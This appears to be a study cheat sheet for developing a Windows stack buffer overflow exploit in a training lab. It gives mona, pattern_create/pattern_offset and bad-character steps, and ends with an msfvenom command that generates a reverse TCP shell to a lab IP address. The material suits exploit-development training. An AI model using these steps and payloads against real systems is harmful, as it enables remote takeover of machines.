1. ( Set current working directory)
```
!mona config -set workingfolder c:\mona\%p
```

2. ( Fuzz with fuzz.py to find amount of bytes)

4. ( Generate cyclic payload and paste it in payload add 400 bytes to it)
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

5. ( put EIP address into q to find offset)
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 76413176

!mona findmsp -distance 600
```

6. ( identify bad character and set retn = "BBBB")
```
python3 temp.py
```

7. ( mona command to find bad character)
```
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

8. ( find a jump address and put in the bad bytes in command)
```
!mona jmp -r esp -cpb "\x00"
```

9. ( copy jump address and make sure to put it in little endian)
retn = [jump address]

10. ( generate actual shell payload and include bad bytes)
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.18.145 LPORT=53 EXITFUNC=thread -f c -b "\x00\x23\x3c\x83\xba"
```

11. ( set padding) 
ipadding = "\x90" * 16